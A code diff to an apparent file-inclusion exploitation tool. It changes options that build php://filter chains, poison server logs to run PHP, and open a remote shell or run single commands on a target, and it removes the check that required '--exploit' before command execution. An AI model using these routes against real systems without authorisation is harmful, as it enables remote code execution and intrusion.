@@ -79,10 +79,10 @@ def add_arguments(parser: argparse.ArgumentParser) -> None:
     exploit.add_argument(
         "--exploit",
         action="store_true",
-        help="act on the target: build a php://filter chain and run it there. With --os-cmd "
-        "or --os-shell the chain runs your command; without them it runs a marker, which "
-        "proves the chain works on this target before you put a command in it. "
-        "--log-path is the route that needs no php://filter",
+        help="go further than the finding, on the tool's own initiative: build a php://filter "
+        "chain and send it, and report whether it runs. It runs a marker, not a command - for "
+        "a command of your own, say so with --os-cmd or --os-shell, which do not need this "
+        "flag",
     )
     exploit.add_argument(
         "--make-phar",
@@ -127,7 +127,7 @@ def add_arguments(parser: argparse.ArgumentParser) -> None:
         "--log-path",
         metavar="PATH",
         help="run commands by planting PHP in a log the target writes, then including it. Needs "
-        "--exploit, and one of --os-cmd or --os-shell. This is the route that still works when "
+        "one of --os-cmd or --os-shell. This is the route that still works when "
         "every wrapper is refused, because a plain path reaches include() where php://filter "
         "does not. Point it at the server's access log, e.g. /var/log/nginx/access.log; the "
         "application must be able to read it, and it must be small enough to include whole",
@@ -136,13 +136,14 @@ def add_arguments(parser: argparse.ArgumentParser) -> None:
         "--os-shell",
         action="store_true",
         help="open a live shell on the target: type commands, read their output, 'exit' to leave. "
-        "Needs --exploit as well. The chain is built once and a short reader takes each command "
+        "The chain is built once and a short reader takes each command "
         "from a second parameter, so a session costs one long request per command",
     )
     exploit.add_argument(
         "--os-cmd",
         metavar="COMMAND",
-        help="run one command and print its output, then exit. Needs --exploit as well",
+        help="run one command and print its output, then exit. It appears with the results, "
+        "under Commands run:",
     )
 
 
@@ -184,16 +185,14 @@ def run(args: argparse.Namespace, runtime) -> int:
         or getattr(args, "log_path", None)
     )
     if wants_shell:
-        if not getattr(args, "exploit", False):
-            # Running a command on the target is the most invasive thing this
-            # tool does, and every state graph gates it behind --exploit. These
-            # flags are that same act asked for more directly, so they answer to
-            # the same switch instead of skipping it - the strongest primitive
-            # is the last one that should be reachable by accident.
-            raise SystemExit(
-                "--os-shell, --os-cmd and --log-path run commands on the target; "
-                "pass --exploit to say that is what you want"
-            )
+        # `--os-shell`, `--os-cmd` and `--log-path` are the request. The command
+        # is in the argv, so there is nothing left for a second switch to
+        # confirm: asking for a command to run and then being told to ask again
+        # is how a tool ends up doubting the operator twice over one decision.
+        #
+        # `--exploit` is a different thing and stays: it is the tool deciding for
+        # itself to go further than the finding - build a chain, send it, see
+        # whether it runs - which is exactly the decision that should be opt-in.
         return run_shell(args, runtime)
     return run_targets(args, runtime, NAME, LIKELY_PARAMS, run_one)
 
@@ -293,7 +292,13 @@ def run_shell(args: argparse.Namespace, runtime) -> int:
         runtime.info(f"   the shell answered its arithmetic check ({answer})")
 
         if args.os_cmd:
-            return run_once(execute, args.os_cmd)
+            # One command is a result, so it is shown with the results at the end
+            # - the same place a file that was read is shown, and the same shape
+            # the other two classes print. A session is different: its output has
+            # to appear as it happens, so that one prints inline.
+            text = execute(args.os_cmd)
+            board.remember_run(args.os_cmd, text)
+            return 0
         return run_shell_loop(
             execute,
             prompt=runtime.paint("os-shell> ", "next"),
@@ -302,6 +307,8 @@ def run_shell(args: argparse.Namespace, runtime) -> int:
     finally:
         # A shell is the place an interrupt is most likely, and what was learned
         # about the filter on the way in is what the next attempt wants.
+        emit_summary(runtime, board, args)
+        close_board(args, board, request)
         close_filters(args, context.bypass, request)
 
 
